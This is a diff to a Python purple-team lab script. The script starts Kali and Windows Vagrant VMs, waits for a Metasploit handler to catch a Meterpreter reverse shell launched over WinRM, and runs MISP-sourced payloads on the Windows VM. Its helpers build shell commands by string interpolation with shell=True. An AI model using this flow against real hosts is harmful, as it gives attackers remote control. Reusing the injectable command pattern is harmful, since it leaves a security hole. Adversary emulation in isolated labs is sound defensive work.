@@ -15,7 +15,10 @@ import base64
 import zipfile
 import os 
 from termcolor import colored
-
+import subprocess
+from apscheduler.schedulers.background import BackgroundScheduler
+import threading
+from time import sleep
 with open('config.yml', 'r') as file:
     config = yaml.safe_load(file)
 
@@ -27,12 +30,17 @@ MSF_LPORT = config['msf']['LPORT']
 MISP_URL = config['misp']['url']
 MISP_TOKEN = config['misp']['api_token']
 PAYLOAD_DOWNLOAD_PATH = config['misp']['payload_download_path']
+KALI_PATH = config['virt_machines']['kali']
+WIN_PURPLE_PATH = config['virt_machines']['win-purple']
+
 
 main_msf_session_key = 1
 main_msf_session = None
+msf_active = False
 
 MSF_CLIENT = None
 MISP_CLIENT = None
+
 
 @retry(wait=wait_fixed(5))
 def init_msf():
@@ -117,12 +125,13 @@ def download_misp_payload(payload, execute=True):
         output = shell.run_shell_cmd_with_output(f"powershell.exe C:\\Users\\vagrant\\vagrant_data\\payloads\\{name}", None, exit_shell=False)
         print(output)
 
-@retry(stop=stop_after_delay(300))
+@retry(stop=stop_after_delay(600))
 def meterpreter_connect():
     """
     Connect to Meterpreter (meterpreter-0.exe running on Win VM)
     """
-    global main_msf_session 
+    global main_msf_session
+    global msf_active
     try:
         print()
         print_info("[*] Configuring Metasploit Exploit...")
@@ -145,6 +154,7 @@ def meterpreter_connect():
         shell = MSF_CLIENT.sessions.session(main_msf_session_key)
         print_info("[*] Testing shell command\n")
         print(shell.run_shell_cmd_with_output("net accounts", None))
+        msf_active = True
     except Exception:
         print_error("[-] Connection Failed, retrying...")
         raise Exception
@@ -167,14 +177,34 @@ def print_error(msg):
 def print_info(msg):
     print(colored(msg, 'green'))
 
+def vagrant_cmd(template_path, vagrant_cmd):
+    cmd = f"cd {template_path} && vagrant {vagrant_cmd}"
+    print_info(f"Running: {cmd}" )
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    print(result)
 
+def vagrant_winrm(powershell_cmd):
+    powershell_cmd = f"cd {WIN_PURPLE_PATH} && vagrant winrm --shell powershell --elevated --command '{powershell_cmd}'" 
+    result = subprocess.run(powershell_cmd, shell=True, capture_output=True, text=True)
+    print(result.stdout)
+    
 def main():
     global MSF_CLIENT
     global MISP_CLIENT
-    MSF_CLIENT = init_msf()
-    MISP_CLIENT = init_misp()
-    meterpreter_connect()
+    global main_msf_session
     
+    
+    MISP_CLIENT = init_misp()
+    vagrant_cmd(KALI_PATH, 'up')
+    MSF_CLIENT = init_msf()
+    thread = threading.Thread(target=meterpreter_connect)
+    thread.start()
+    vagrant_cmd(WIN_PURPLE_PATH, 'up')
+    while msf_active == False:
+        sleep(60)
+        vagrant_winrm("C:\vagrant\meterpreter-0.exe")
+
+    thread.join()
     print()
     event_id = input("[*] Input MISP Event ID to emulate: ")
     
